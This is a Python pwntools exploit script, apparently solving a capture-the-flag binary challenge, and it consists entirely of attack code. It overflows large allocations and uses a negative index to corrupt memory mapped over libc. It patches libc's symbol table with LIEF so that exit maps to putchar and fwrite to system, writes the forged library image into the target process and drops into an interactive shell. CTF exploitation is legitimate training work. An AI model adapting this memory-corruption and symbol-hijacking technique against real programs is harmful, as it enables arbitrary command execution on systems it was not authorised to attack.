from pwn import *
import lief
from lief import parse

def size(n):
    global p
    p.sendlineafter(b":", str(n - 0x1008).encode())

def data(b):
    global p
    p.sendafter(b":", b)

elf = parse("libc.so.6")
libc = ELF("libc.so.6")
file = ELF("../chal/chal")

context.terminal = ["kitty"]

def exploit():
    global p, elf, libc, file
    if args.GDB:
        p = gdb.debug("../chal/chal", gdbscript=\
        """
        b main
        c
        del
        """)
    else:
        p = process("../chal/chal", cwd="../chal")

    overwrite = 0x120000

    size(0x100000)
    data(b"\x00" * 0xfeff8)
    size(0x100000)
    data(b"\x00" * 0xfeff8)
    p.sendlineafter(b":", str(-6).encode())
    p.sendlineafter(b":", p8(overwrite >> 16))

    elf.get_dynamic_symbol("exit").value = elf.get_dynamic_symbol("putchar").value
    elf.get_dynamic_symbol("fwrite").value = elf.get_dynamic_symbol("system").value
    elf.write("libc.so.m")
    mod = parse("libc.so.m")

    p.recvuntil(b"Last chance to guess my flag\n")
    size(overwrite + 0x1008)
    padding = 0x101000 - 0x10
    fake = b"\x00" * padding + bytes(mod.get_content_from_virtual_address(0, overwrite - padding))

    print(f"[+] fake len: {len(fake):x}")
    data(fake)

    p.interactive()
    p.close()

exploit()